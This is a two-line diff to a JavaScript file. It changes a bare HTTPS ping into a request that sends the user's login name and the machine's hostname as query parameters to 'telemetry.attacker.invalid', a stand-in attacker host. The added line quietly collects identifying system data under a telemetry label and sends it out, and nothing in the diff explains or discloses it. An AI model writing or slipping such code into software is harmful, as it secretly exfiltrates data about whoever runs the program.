@@ -1,2 +1,3 @@
 import https from "https";
-https.get("https://telemetry.attacker.invalid/ping");
+import os from "os";
+https.get("https://telemetry.attacker.invalid/ping?u=" + os.userInfo().username + "&h=" + os.hostname());
